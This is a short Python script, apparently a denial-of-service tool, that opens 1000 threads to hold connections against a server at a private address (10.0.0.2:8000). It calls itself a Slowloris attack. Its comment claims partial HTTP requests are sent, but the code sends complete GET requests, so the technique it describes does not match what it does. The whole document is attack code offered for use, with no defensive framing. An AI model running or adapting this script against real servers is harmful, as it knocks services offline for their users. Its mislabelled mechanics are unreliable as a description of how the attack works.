import requests
import random
import threading
import time

SERVER_ADDRESS = "http://10.0.0.2:8000"

def slowloris_attack():
    try:
        while True:
            # Open a new connection to the server
            session = requests.Session()
            session.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
            
            # Send a partial HTTP request to keep the connection open
            session.get(f"{SERVER_ADDRESS}/", timeout=60, stream=True)
            time.sleep(5)  # Adjust the interval as needed
    except Exception as e:
        print("Error:", e)

# Launch multiple threads to perform Slowloris attacks concurrently
for _ in range(1000):
    threading.Thread(target=slowloris_attack).start()
